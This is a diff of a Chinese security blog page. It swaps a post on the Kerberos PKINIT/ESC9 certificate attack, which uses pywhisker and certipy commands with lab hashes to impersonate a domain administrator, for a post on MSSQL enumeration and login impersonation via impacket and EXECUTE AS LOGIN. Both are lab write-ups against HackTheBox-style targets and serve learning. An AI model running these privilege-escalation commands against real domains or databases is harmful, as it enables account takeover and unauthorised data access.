@@ -22,24 +22,28 @@
 
     <meta name="description" content="仅学习记录用">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Kerberos协议及攻击">
-<meta property="og:url" content="http://dawoxiansigema.github.io/2025/11/12/Kerberos%E5%8D%8F%E8%AE%AE%E5%8F%8A%E6%94%BB%E5%87%BB/index.html">
+<meta property="og:title" content="Mssql渗透枚举">
+<meta property="og:url" content="http://dawoxiansigema.github.io/2025/11/28/Mssql%E6%B8%97%E9%80%8F%E6%9E%9A%E4%B8%BE/index.html">
 <meta property="og:site_name" content="Eur3ka&#39;s Studio">
 <meta property="og:description" content="仅学习记录用">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2025-11-12T14:27:55.000Z">
-<meta property="article:modified_time" content="2025-11-13T15:32:08.000Z">
+<meta property="og:image" content="http://dawoxiansigema.github.io/2025/11/28/Mssql%E6%B8%97%E9%80%8F%E6%9E%9A%E4%B8%BE/1.png">
+<meta property="og:image" content="http://dawoxiansigema.github.io/2025/11/28/Mssql%E6%B8%97%E9%80%8F%E6%9E%9A%E4%B8%BE/2.png">
+<meta property="og:image" content="http://dawoxiansigema.github.io/2025/11/28/Mssql%E6%B8%97%E9%80%8F%E6%9E%9A%E4%B8%BE/3.png">
+<meta property="article:published_time" content="2025-11-28T03:39:11.000Z">
+<meta property="article:modified_time" content="2025-11-28T14:26:54.842Z">
 <meta property="article:author" content="Xu Haoxiang">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://dawoxiansigema.github.io/2025/11/28/Mssql%E6%B8%97%E9%80%8F%E6%9E%9A%E4%B8%BE/1.png">
 
 
-<link rel="canonical" href="http://dawoxiansigema.github.io/2025/11/12/Kerberos%E5%8D%8F%E8%AE%AE%E5%8F%8A%E6%94%BB%E5%87%BB/">
+<link rel="canonical" href="http://dawoxiansigema.github.io/2025/11/28/Mssql%E6%B8%97%E9%80%8F%E6%9E%9A%E4%B8%BE/">
 
 
-<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://dawoxiansigema.github.io/2025/11/12/Kerberos%E5%8D%8F%E8%AE%AE%E5%8F%8A%E6%94%BB%E5%87%BB/","path":"2025/11/12/Kerberos协议及攻击/","title":"Kerberos协议及攻击"}</script>
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://dawoxiansigema.github.io/2025/11/28/Mssql%E6%B8%97%E9%80%8F%E6%9E%9A%E4%B8%BE/","path":"2025/11/28/Mssql渗透枚举/","title":"Mssql渗透枚举"}</script>
 
 <script class="next-config" data-name="calendar" type="application/json">""</script>
-<title>Kerberos协议及攻击 | Eur3ka's Studio</title>
+<title>Mssql渗透枚举 | Eur3ka's Studio</title>
   
 
 
@@ -128,7 +132,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8D%8F%E8%AE%AE"><span class="nav-number">1.</span> <span class="nav-text">协议</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#PKINIT"><span class="nav-number">1.1.</span> <span class="nav-text">PKINIT</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%94%BB%E5%87%BB"><span class="nav-number">2.</span> <span class="nav-text">攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#ESC9"><span class="nav-number">2.1.</span> <span class="nav-text">ESC9</span></a></li></ol></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%9F%BA%E6%9C%AC%E6%9F%A5%E8%AF%A2"><span class="nav-number">1.</span> <span class="nav-text">基本查询</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95"><span class="nav-number">2.</span> <span class="nav-text">渗透测试</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="nav-number">2.1.</span> <span class="nav-text">信息搜集</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95"><span class="nav-number">2.2.</span> <span class="nav-text">模拟登录</span></a></li></ol></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -175,7 +179,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://dawoxiansigema.github.io/2025/11/12/Kerberos%E5%8D%8F%E8%AE%AE%E5%8F%8A%E6%94%BB%E5%87%BB/">
+    <link itemprop="mainEntityOfPage" href="http://dawoxiansigema.github.io/2025/11/28/Mssql%E6%B8%97%E9%80%8F%E6%9E%9A%E4%B8%BE/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.jpg">
@@ -188,12 +192,12 @@
     </span>
 
     <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="Kerberos协议及攻击 | Eur3ka's Studio">
+      <meta itemprop="name" content="Mssql渗透枚举 | Eur3ka's Studio">
       <meta itemprop="description" content="">
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          Kerberos协议及攻击
+          Mssql渗透枚举
         </h1>
 
         <div class="post-meta-container">
@@ -203,15 +207,9 @@
         <i class="far fa-calendar"></i>
       </span>
       <span class="post-meta-item-text">Posted on</span>
+      
 
-      <time title="Created: 2025-11-12 22:27:55" itemprop="dateCreated datePublished" datetime="2025-11-12T22:27:55+08:00">2025-11-12</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2025-11-13 23:32:08" itemprop="dateModified" datetime="2025-11-13T23:32:08+08:00">2025-11-13</time>
+      <time title="Created: 2025-11-28 11:39:11 / Modified: 22:26:54" itemprop="dateCreated datePublished" datetime="2025-11-28T11:39:11+08:00">2025-11-28</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -235,58 +233,65 @@
     <div class="post-body" itemprop="articleBody"><p>仅学习记录用</p>
 <span id="more"></span>
 
-<h1 id="协议"><a href="#协议" class="headerlink" title="协议"></a>协议</h1><h2 id="PKINIT"><a href="#PKINIT" class="headerlink" title="PKINIT"></a>PKINIT</h2><p>PKINIT 是 Kerberos 协议的扩展，允许使用 X.509 证书代替密码进行身份认证。例如，当我们使用 pywhisker.py 向 management_svc 的 msDS-KeyCredentialLink 属性中添加生成的证书信息后意味着</p>
-<ul>
-<li>域控制器（KDC）会信任该证书与 management_svc 账号的绑定关系。</li>
-<li>持有该证书私钥的人，可通过 PKINIT 协议向 KDC 请求 management_svc 的 TGT（无需知道其密码）。</li>
-</ul>
-<p>该部分与委派不同 委派本质是权限传递 而PKINIT本质是直接扮演</p>
-<pre><code>┌──(kali㉿kali)-[~/Desktop/red/pywhisker/pywhisker]
-└─$ python3 pywhisker.py -d &quot;certified.htb&quot; -u &quot;judith.mader&quot; -p &quot;judith09&quot; --target &quot;management_svc&quot; --action &quot;add&quot;
-[*] Searching for the target account
-[*] Target user found: CN=management service,CN=Users,DC=certified,DC=htb
-[*] Generating certificate
-[*] Certificate generated
-[*] Generating KeyCredential
-[*] KeyCredential generated with DeviceID: f1ba22ce-463f-67f3-50a4-285a113ea68f
-[*] Updating the msDS-KeyCredentialLink attribute of management_svc
-[+] Updated the msDS-KeyCredentialLink attribute of the target object
-[*] Converting PEM -&gt; PFX with cryptography: VE69zj7b.pfx
-[+] PFX exportiert nach: VE69zj7b.pfx
-[i] Passwort für PFX: 8mhSSs9ylJfNe4oQPh9P
-[+] Saved PFX (#PKCS12) certificate &amp; key at path: VE69zj7b.pfx
-[*] Must be used with password: 8mhSSs9ylJfNe4oQPh9P
-[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
+<h1 id="基本查询"><a href="#基本查询" class="headerlink" title="基本查询"></a>基本查询</h1><p>使用impacket包的mssqlclient.py包进行连接</p>
+<pre><code>❯ mssqlclient.py &#39;kevin&#39;:&#39;iNa2we6haRj2gaw!&#39;@10.10.11.95
+Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies
+
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(DC01): Line 1: Changed database context to &#39;master&#39;.
+[*] INFO(DC01): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server 2022 RTM (16.0.1000)
+[!] Press help for extra shell commands
+SQL (kevin  guest@master)&gt;
 </code></pre>
-<p>比如上述payload显示<code>pywhisker.py</code>利用委派获取management_svc的TGT 因为他们在同组很好办到 拿到TGT之后还有剩下的操作来获取NTLM 不过可以使用<code>certipy</code>来一条龙 比<code>pywhisker.py</code>方便</p>
-<h1 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h1><p>以下漏洞都是基于certipy进行查找与攻击 <a target="_blank" rel="noopener" href="https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation">官方exploit</a></p>
-<pre><code>certipy find -vulnerable -u ca_operator -hashes :b4b86f45c6018f1b664f70805f45d8f2 -dc-ip 10.10.11.41 -stdout
+<p>查询所有库名</p>
+<pre><code>SQL (appdev  appdev@master)&gt; select name from master.dbo.sysdatabases;
+name
+-----------------
+master
+tempdb
+model
+msdb
+financial_planner
 </code></pre>
-<h2 id="ESC9"><a href="#ESC9" class="headerlink" title="ESC9"></a>ESC9</h2><p>ESC9 漏洞，与名为 CertifiedAuthentication 的证书模板相关。此漏洞的核心在于：对证书模板拥有注册权限的用户可以请求证书，并且由于模板配置不当（缺少必要的安全扩展，如 CT_FLAG_NO_SECURITY_EXTENSION 未设置），攻击者可以通过在证书请求中指定一个备用主体名 (SAN) 来冒充其他用户，例如域管理员。</p>
-<p>以<a href="/2025/11/10/Certified">Certified</a>靶机为例 使用certipy找到存在ESC9漏洞后 执行如下步骤</p>
-<ul>
-<li>management_svc对ca_operator有GenericAll权限 使用exploit修改ca_operator的UPN(userPrincipalName)为Administrator</li>
-</ul>
-<p>通过篡改低权限 “受害者账户” 的 UPN，让申请到的证书 SAN 字段包含高权限账户的标识，进而欺骗域控制器获取高权限凭证。</p>
-<pre><code>certipy account update -u management_svc -hashes :a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn Administrator -dc-ip 10.10.11.41 
+<p>切换不同库</p>
+<pre><code>SQL (appdev  appdev@master)&gt; use financial_planner
+ENVCHANGE(DATABASE): Old Value: master, New Value: financial_planner
+INFO(DC01): Line 1: Changed database context to &#39;financial_planner&#39;.
 </code></pre>
-<ul>
-<li>篡改UPN权限后 生成证书模板 模板名字为在certipy -find中可以查到</li>
-</ul>
-<pre><code>certipy req -u ca_operator -hashes :b4b86f45c6018f1b664f70805f45d8f2 -ca certified-DC01-CA -template CertifiedAuthentication -dc-ip 10.10.11.41
+<p>查询库内所有表名</p>
+<pre><code>SQL (appdev  appdev@financial_planner)&gt; SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = &#39;BASE TABLE&#39;;
+TABLE_NAME
+-----------
+users
+incomes
+expenses
+allocations
+analytics
+visits
 </code></pre>
-<ul>
-<li>生成完证书模板之后 需要将ca_operator的UPN再改回去 因为一会要通过证书认证(此步不做也不一定百分百会失败)</li>
-</ul>
-<pre><code>certipy account update -u management_svc -hashes :a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn ca_operator@certified.htb -dc-ip 10.10.11.41 
+<p>查表就很简单了 直接<code>select * from 表名</code></p>
+<h1 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h1><p>本部分<a target="_blank" rel="noopener" href="http://geekby.site/2021/01/mssql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86">引用源</a> 本文仅用与自己学习积累用 侵删烦请联系<a href="mailto:&#50;&#x30;&#55;&#x31;&#57;&#55;&#48;&#x30;&#x34;&#x32;&#x40;&#x71;&#x71;&#46;&#99;&#111;&#109;">2071970042@qq.com</a></p>
+<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>权限架构可分为以下三类 一般在渗透测试时也只需关注服务器级别主体和数据库级别主体</p>
+<p><img src="/2025/11/28/Mssql%E6%B8%97%E9%80%8F%E6%9E%9A%E4%B8%BE/1.png"></p>
+<p>对服务器级别角色说明如下 可使用<code>select is_srvrolemember(&#39;&#39;)</code>来查询 查询结果为0&#x2F;1</p>
+<p><img src="/2025/11/28/Mssql%E6%B8%97%E9%80%8F%E6%9E%9A%E4%B8%BE/2.png"></p>
+<p>对数据库级别角色说明如下 可使用<code>select IS_MEMBER(&#39;&#39;)</code>来查询 查询结果为0&#x2F;1</p>
+<p><img src="/2025/11/28/Mssql%E6%B8%97%E9%80%8F%E6%9E%9A%E4%B8%BE/3.png"></p>
+<h2 id="模拟登录"><a href="#模拟登录" class="headerlink" title="模拟登录"></a>模拟登录</h2><p>说实话为什么要保留这个功能不太理解 用以下指令查询可模拟登录的用户</p>
+<pre><code>SQL (kevin  guest@master)&gt; SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = &#39;IMPERSONATE&#39;
+name
+------
+appdev
 </code></pre>
-<ul>
-<li>最后通过生成的pfx证书 获取管理员的NTLM哈希</li>
-</ul>
-<p><code>certipy auth -pfx</code> 命令的作用是：用证书向域控制器的 KDC 服务请求 Kerberos 票据（TGT）。<br>域控制器收到请求后，检查证书的 SAN 字段，发现 UPN 是administrator，且因缺少安全扩展无法验证 SID，便默认该证书属于administrator账户。<br>因此，KDC 会为 “administrator” 签发 TGT（票据授予票据），甚至允许提取该账户的 NT 哈希（通过 Kerberos 协议的某些扩展功能）。</p>
-<pre><code>certipy auth -pfx administrator.pfx -dc-ip 10.10.11.41 -domain certified.htb
+<p>再用以下命令模拟登录</p>
+<pre><code>SQL (kevin  guest@master)&gt; EXECUTE AS LOGIN = &#39;appdev&#39;
+SQL (appdev  appdev@master)&gt;
 </code></pre>
-<p>据此就可以通过certipy获取获取管理员的NTLM哈希</p>
+<p>这样就可以模拟某个用户登录 并以该用户的权限进行操作 wtf</p>
 
     </div>
 
@@ -300,14 +305,11 @@
 
           <div class="post-nav">
             <div class="post-nav-item">
-                <a href="/2025/11/10/Certified/" rel="prev" title="Certified">
-                  <i class="fa fa-angle-left"></i> Certified
+                <a href="/2025/11/28/Eighteen/" rel="prev" title="Eighteen">
+                  <i class="fa fa-angle-left"></i> Eighteen
                 </a>
             </div>
             <div class="post-nav-item">
-                <a href="/2025/11/27/Administrator/" rel="next" title="Administrator">
-                  Administrator <i class="fa fa-angle-right"></i>
-                </a>
             </div>
           </div>
     </footer>
